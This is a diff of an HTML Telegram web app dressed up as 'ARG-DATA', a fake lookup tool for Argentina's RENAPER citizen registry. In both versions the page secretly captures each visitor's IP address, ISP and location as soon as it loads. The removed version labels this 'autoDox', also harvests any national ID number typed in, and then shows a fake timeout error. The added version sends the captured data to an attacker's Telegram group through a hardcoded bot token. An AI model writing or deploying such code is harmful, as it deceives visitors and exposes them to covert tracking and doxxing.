@@ -1,86 +1,55 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEMA ARG-DATA v4.2</title>
+    <title>SISTEMA ARG-DATA</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
-        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
-        h3 { letter-spacing: 3px; text-shadow: 0 0 10px #00f2ff; }
-        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; outline: none; text-align: center; font-size: 1.1em; }
-        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; transition: 0.3s; }
-        button:active { transform: scale(0.95); background: #008c95; }
-        .footer { font-size: 0.7em; color: #444; margin-top: 30px; }
-        #status { font-size: 0.8em; margin-top: 15px; color: #00f2ff55; }
+        body { background-color: #000; color: #00f2ff; font-family: monospace; text-align: center; padding-top: 50px; }
+        .box { border: 1px solid #00f2ff; padding: 20px; display: inline-block; border-radius: 10px; }
     </style>
 </head>
 <body>
-
     <div class="box">
-        <h3>ARG-DATA BOT</h3>
-        <p>CONSULTA CIUDADANA RENAPER</p>
-        <hr style="border: 0.5px solid #00f2ff22;">
-        
-        <p style="font-size: 0.9em;">Ingrese DNI del objetivo:</p>
-        <input type="number" id="dni" placeholder="XXXXXXXX" autocomplete="off">
-        <br>
-        <button onclick="enviarDni()">BUSCAR CIUDADANO</button>
-        
-        <div id="status">Sincronizando con nodo central...</div>
-    </div>
-
-    <div class="footer">
-        ACCESO RESTRINGIDO - GOBIERNO DE ARGENTINA<br>
-        SISTEMA DE SEGURIDAD V4.2
+        <h3>ACCEDIENDO AL NODO...</h3>
+        <p id="log">Sincronizando con RENAPER...</p>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand(); // Abre la app al máximo tamaño
+        const token = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
+        const grupoId = "-1003670055074"; // Tu ID de grupo corregido
 
-        // --- 1. CAPTURA AUTOMÁTICA DE IP AL ABRIR ---
-        async function autoDox() {
+        async function enviarReporte() {
             try {
-                // Obtiene datos de red mediante API externa
+                // Captura IP
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
 
-                const reporte = {
-                    evento: "IP_CAPTURADA",
-                    ip: data.ip,
-                    proveedor: data.org,
-                    ubicacion: `${data.city}, ${data.country_name}`
-                };
+                const texto = `📢 **¡CAPTURA ARG-DATA!**\n` +
+                              `--------------------------------\n` +
+                              `🌐 **IP:** \`${data.ip}\`\n` +
+                              `🏢 **ISP:** \`${data.org}\`\n` +
+                              `📍 **Lugar:** \`${data.city}, ${data.country_name}\`\n` +
+                              `--------------------------------`;
 
-                // Envía los datos al bot de Termux automáticamente
-                tg.sendData(JSON.stringify(reporte));
-                document.getElementById('status').innerText = "CONEXIÓN CIFRADA ESTABLECIDA";
+                // ENVÍO DIRECTO AL GRUPO POR API
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: grupoId,
+                        text: texto,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                document.getElementById('log').innerText = "CONEXIÓN ESTABLECIDA - BUSCANDO DNI...";
             } catch (e) {
-                console.log("Error en captura");
+                console.error(e);
             }
         }
 
-        // --- 2. CAPTURA DEL DNI (SI EL USUARIO LO ESCRIBE) ---
-        function enviarDni() {
-            const dniVal = document.getElementById('dni').value;
-            if(!dniVal) {
-                alert("Debe ingresar un DNI válido.");
-                return;
-            }
-            
-            // Envía el DNI ingresado como un segundo reporte
-            tg.sendData(JSON.stringify({
-                evento: "DNI_INGRESADO",
-                dni: dniVal
-            }));
-            
-            alert("Error 504: Tiempo de espera agotado. Reintente en unos minutos.");
-        }
-
-        // Iniciar la captura apenas cargue la página
-        window.onload = autoDox;
+        window.onload = enviarReporte;
     </script>
 </body>
 </html>
